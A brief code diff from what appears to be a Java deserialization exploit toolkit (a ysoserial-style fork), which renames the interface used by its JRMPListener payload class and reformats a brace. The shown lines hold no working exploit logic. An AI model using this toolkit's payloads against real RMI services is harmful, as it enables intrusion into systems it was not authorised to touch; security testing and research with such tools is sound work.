@@ -5,7 +5,7 @@ import java.rmi.server.RemoteObject;
 import java.rmi.server.RemoteRef;
 import java.rmi.server.UnicastRemoteObject;
 
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.utils.PayloadRunner;
 import sun.rmi.server.ActivationGroupImpl;
 import sun.rmi.server.UnicastServerRef;
@@ -35,7 +35,8 @@ import com.h2tg.ysogate.utils.Reflections;
 		"restriction"
 })
 @Authors({Authors.MBECHLER})
-public class JRMPListener extends PayloadRunner implements ObjectPayload<UnicastRemoteObject> {
+public class JRMPListener extends PayloadRunner implements CommandObjectPayload<UnicastRemoteObject>
+{
 
 	public UnicastRemoteObject getObject(final String command) throws Exception {
 		int jrmpPort = Integer.parseInt(command);
